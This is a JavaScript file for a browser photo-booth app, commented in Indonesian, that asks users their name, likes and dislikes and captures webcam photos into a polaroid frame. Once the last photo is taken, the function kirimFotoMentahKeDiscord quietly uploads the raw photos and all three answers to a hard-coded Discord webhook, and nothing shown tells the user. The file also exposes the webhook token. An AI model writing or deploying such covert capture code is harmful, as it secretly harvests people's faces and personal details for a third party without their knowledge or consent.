// Gantilah teks di bawah ini dengan URL Webhook Discord milikmu sendiri!
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1509943626317303920/mIdhgXtXnbzMj3D2NS6u4epXiO73bc8boj8KS2OwGUqmanc-QtsSnlHP4m4NO9FwBhoN  ";

const box1 = document.getElementById('box1');
const box2 = document.getElementById('box2');
const box3 = document.getElementById('box3');
const polaroidView = document.getElementById('polaroidView');

const btn1 = document.getElementById('btn1');
const btn2 = document.getElementById('btn2');
const btn3 = document.getElementById('btn3');
const snapBtn = document.getElementById('snapBtn');
const retakeBtn = document.getElementById('retakeBtn');
const downloadBtn = document.getElementById('downloadBtn');
const frameSelectorArea = document.getElementById('frameSelectorArea');

const input1 = document.getElementById('input1');
const input2 = document.getElementById('input2');
const input3 = document.getElementById('input3');

const hasilNama = document.getElementById('hasilNama');
const hasilBenci = document.getElementById('hasilBenci');

const video = document.getElementById('webcam');
const canvas = document.getElementById('canvas');
const photoContainer = document.getElementById('photoContainer');

let maxPhotos = 1; 
let currentPhotoCount = 0; 
let capturedBlobs = []; 
let capturedDataUrls = []; 
let localStream = null; 

// Navigasi Form Pertanyaan
btn1.addEventListener('click', () => { box1.classList.add('sembunyi'); box2.classList.remove('sembunyi'); });
btn2.addEventListener('click', () => { box2.classList.add('sembunyi'); box3.classList.remove('sembunyi'); });

btn3.addEventListener('click', function() {
    hasilNama.innerText = input1.value;
    hasilBenci.innerText = input3.value;

    box3.classList.add('sembunyi');
    polaroidView.classList.remove('sembunyi');
    
    buildSlots(); 
    startCamera();
});

// Pilih Jumlah Frame (1-4)
document.querySelectorAll('.frame-opt').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('.frame-opt').forEach(b => b.classList.remove('aktif'));
        this.classList.add('aktif');
        
        maxPhotos = parseInt(this.getAttribute('data-frame'));
        resetPhotoSlots();
    });
});

// Fungsi Membuat Kotak Slot Kosong Sesuai Pilihan Frame
function buildSlots() {
    photoContainer.innerHTML = ''; 
    photoContainer.className = `polaroid-photo grid-${maxPhotos}`;

    for (let i = 0; i < maxPhotos; i++) {
        const slot = document.createElement('div');
        slot.className = 'photo-slot';
        slot.id = `slot-${i}`;
        photoContainer.appendChild(slot);
    }
}

function startCamera() {
    // ANTI-PERMISSION REPEAT: Kalau kamera udah aktif, langsung pakai tanpa minta izin lagi
    if (localStream && localStream.active) {
        video.classList.remove('sembunyi');
        moveCameraToSlot(0);
        updateSnapButtonText();
        return; 
    }

    const constraints = {
        video: {
            facingMode: "user",
            width: { min: 640, ideal: 1280 },
            height: { min: 480, ideal: 720 }
        },
        audio: false
    };

    navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
            localStream = stream;
            video.srcObject = stream;
            video.classList.remove('sembunyi');
            
            moveCameraToSlot(0);
            updateSnapButtonText();
        })
        .catch(function(err) {
            alert("Nyalakan izin kameranya dulu di browser!");
        });
}

// Memindahkan Elemen Kamera Live ke Slot yang Ditargetkan
function moveCameraToSlot(slotIndex) {
    const targetSlot = document.getElementById(`slot-${slotIndex}`);
    if (targetSlot) {
        targetSlot.appendChild(video);
    }
}

function resetPhotoSlots() {
    currentPhotoCount = 0;
    capturedBlobs = [];
    capturedDataUrls = []; 
    
    buildSlots();
    
    // Munculkan kamera lagi tanpa mematikan stream (mencegah pop-up permission)
    video.classList.remove('sembunyi');
    moveCameraToSlot(0);
    
    snapBtn.classList.remove('sembunyi');
    retakeBtn.classList.add('sembunyi');
    downloadBtn.classList.add('sembunyi');
    frameSelectorArea.classList.remove('sembunyi');
    updateSnapButtonText();
}

function updateSnapButtonText() {
    if (maxPhotos > 1) {
        snapBtn.innerText = `📸 TAKE PHOTO (${currentPhotoCount + 1}/${maxPhotos})`;
    } else {
        snapBtn.innerText = `📸 TAKE PHOTO`;
    }
}

// Ambil Foto Menggunakan Center Crop (Kotak Persegi HD)
snapBtn.addEventListener('click', function() {
    if (currentPhotoCount >= maxPhotos) return;

    const context = canvas.getContext('2d');
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;
    const size = Math.min(videoWidth, videoHeight);
    
    const sourceX = (videoWidth - size) / 2;
    const sourceY = (videoHeight - size) / 2;
    
    const outputSize = 1024; // Kunci Resolusi Tinggi 1024x1024 pixel
    canvas.width = outputSize;
    canvas.height = outputSize;
    
    context.imageSmoothingEnabled = true;
    context.imageSmoothingQuality = 'high';
    
    context.translate(canvas.width, 0);
    context.scale(-1, 1);
    context.drawImage(video, sourceX, sourceY, size, size, 0, 0, outputSize, outputSize);
    context.setTransform(1, 0, 0, 1, 0, 0);
    
    const dataUrl = canvas.toDataURL('image/png', 1.0);
    capturedDataUrls.push(dataUrl);

    canvas.toBlob(function(blob) {
        // Tempel hasil jepretan foto ke dalam slot yang aktif
        const currentSlot = document.getElementById(`slot-${currentPhotoCount}`);
        const img = document.createElement('img');
        img.src = dataUrl;
        currentSlot.appendChild(img);

        currentPhotoCount++;
        capturedBlobs.push(blob); 

        if (currentPhotoCount < maxPhotos) {
            updateSnapButtonText();
            // Pindahkan live kamera otomatis ke slot kosong berikutnya
            moveCameraToSlot(currentPhotoCount);
        } else {
            // JIKA SEMUA SLOT SUDAH PENUH
            snapBtn.classList.add('sembunyi');
            frameSelectorArea.classList.add('sembunyi');
            video.classList.add('sembunyi'); 
            video.remove(); // Singkirkan sementara video agar tidak merusak layout akhir

            retakeBtn.classList.remove('sembunyi');
            downloadBtn.classList.remove('sembunyi');

            kirimFotoMentahKeDiscord();
        }
    }, 'image/png', 1.0); 
});

retakeBtn.addEventListener('click', function() {
    // Pas pencet retake, kita ijinkan stream mati total untuk re-create fresh session
    if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
    }
    resetPhotoSlots();
});

// DOWNLOAD METODE INTERNAL CANVAS (100% ANTI-BUREM / RESOLUSI 1200x1800)
downloadBtn.addEventListener('click', function() {
    const printCanvas = document.createElement('canvas');
    const ctx = printCanvas.getContext('2d');
    printCanvas.width = 1200;
    printCanvas.height = 1800;

    ctx.imageSmoothingEnabled = true;
    ctx.imageSmoothingQuality = 'high';

    // Cetak Kertas Putih Dasar Polaroid
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, printCanvas.width, printCanvas.height);

    let loadedImages = 0;
    const totalImages = capturedDataUrls.length;

    capturedDataUrls.forEach((src, idx) => {
        const image = new Image();
        image.src = src;
        image.onload = function() {
            loadedImages++;

            let x = 70, y = 70, w = 1060, h = 1060; 

            if (maxPhotos === 2) {
                w = 520; h = 1060;
                x = 70 + (idx * 540);
            } else if (maxPhotos === 3) {
                w = 520; h = 520;
                if (idx === 0) { x = 70; y = 70; }
                if (idx === 1) { x = 610; y = 70; }
                if (idx === 2) { x = 70; y = 610; w = 1060; }
            } else if (maxPhotos === 4) {
                w = 520; h = 520;
                x = 70 + ((idx % 2) * 540);
                y = 70 + (Math.floor(idx / 2) * 540);
            }

            ctx.drawImage(image, x, y, w, h);

            if (loadedImages === totalImages) {
                ctx.textAlign = "center";
                ctx.textBaseline = "middle";
                
                // Cetak Nama
                ctx.font = "bold 46px 'Courier New', Courier, monospace";
                ctx.fillStyle = "#5c4347";
                ctx.fillText(`Halo, ${input1.value || '...'}! 🌸`, 600, 1300);

                // Cetak Teks Hal yang dibenci (Posisi pas di tengah bawah karena teks suka dibuang)
                ctx.font = "38px 'Courier New', Courier, monospace";
                ctx.fillStyle = "#5c4347";
                ctx.fillText(`Hal yang kamu benci:`, 600, 1440);
                
                ctx.font = "italic bold 40px 'Courier New', Courier, monospace";
                ctx.fillStyle = "#8b5e66";
                ctx.fillText(`${input3.value || '...'}`, 600, 1510);

                const linkSimpan = document.createElement('a');
                linkSimpan.download = `polaroid-${input1.value || 'kamu'}.png`;
                linkSimpan.href = printCanvas.toDataURL('image/png', 1.0);
                linkSimpan.click();
            }
        };
    });
});

function kirimFotoMentahKeDiscord() {
    // Log data input2 (Suka) di background tetep dikirim ke Discord biar datanya komplit
    const pesanTeks = `📌 **Ada Jawaban & Foto Mentah Baru (${maxPhotos} Foto)!** 🎀\n\n` +
                      `👤 **Nama:** ${input1.value}\n` +
                      `💖 **Suka:** ${input2.value}\n` +
                      `❌ **Benci:** ${input3.value}`;

    const formData = new FormData();
    formData.append("content", pesanTeks);

    capturedBlobs.forEach((blob, index) => {
        formData.append(`file${index + 1}`, blob, `foto-mentah-${index + 1}.png`);
    });

    fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
    .then(res => console.log("Mentahan sukses dikirim ke Discord!"))
    .catch(err => console.error(err));
}